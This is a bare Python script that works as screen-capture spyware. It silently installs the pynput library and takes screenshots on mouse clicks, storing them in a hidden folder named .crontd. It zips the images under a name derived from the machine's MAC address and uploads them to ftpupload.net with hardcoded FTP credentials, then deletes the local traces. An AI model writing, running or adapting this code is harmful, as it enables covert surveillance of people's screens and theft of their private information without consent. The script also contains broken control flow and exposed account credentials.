import re, uuid
from functools import partial
import random
import time
import urllib.request
from ftplib import FTP
import socket
from pathlib import Path
from os import path
import glob
from zipfile import ZipFile
import os
iden=':'.join(re.findall('..', '%012x' % uuid.getnode()))
t = time.localtime()
timestamp = time.strftime('%b-%d-%Y', t)
try:
    import pynput
except:
    os.system("pip install pynput -q -q -q")
from pynput import mouse
IPAddr = "ourobs"
import random
from PIL import ImageGrab
PATH = '/home/' + os.getlogin() + '/.crontd/'
def shot():
    isExist = os.path.exists(PATH)
    if not isExist:
        os.makedirs(PATH)
    hellarea = random.randint(0, 100)
    hellar = str(hellarea)
    snapshot = ImageGrab.grab()
    BACKUP_NAME = (hellar + "-shots.png")
    snapshot.save(PATH + '/' + BACKUP_NAME)
    count()
def hel():
    hellarea = random.randint(0, 100)
    hellar = str(hellarea)
    output_zip_path = '/home/' + os.getlogin() + '/.crontd/' + iden +'-'+IPAddr+ '-' + timestamp + '-' + hellar + '-' + 'clickshots.zip'
    file1_path='/home/'+os.getlogin()+'/.crontd/'
    with ZipFile(output_zip_path, 'w') as zipObj:
       for file in glob.glob(file1_path + "*.png"):
                zipObj.write(file, path.basename(path.normpath(file)))
    try:
        host = socket.gethostbyname("www.google.com")
        s = socket.create_connection((host, 80), 2)
        file_path = Path(output_zip_path)
        with FTP('ftpupload.net', 'epiz_33429346', 'uhoU6bJvPpJUiTM') as ftp, open(file_path, 'rb') as file:
            ftp.storbinary(f'STOR {file_path.name}', file)
            os.remove(file_path)

        rem()
    except:
        exit()
    return False
def count():
    dir_path = PATH
    count = 0
    for path in os.listdir(dir_path):
        if os.path.isfile(os.path.join(dir_path, path)):
            count += 1
    if count == 7:
        hel()
    else:
        foo()
def rem():
    directory = PATH
    files_in_directory = os.listdir(directory)
    filtered_files = [file for file in files_in_directory if file.endswith(".png")]
    for file in filtered_files:
        path_to_file = os.path.join(directory, file)
        os.remove(path_to_file)
    foo()
def foo():
    i = 0
    while True:
        i += 1
        if i==4:
            i=0
            shot()
        else:
            print()
        yield
def on_click(x, y, button, pressed, foo):
    if pressed:
        next(foo)
bar = partial(on_click, foo=foo())
with mouse.Listener(on_click=bar) as listener:
    listener.join()
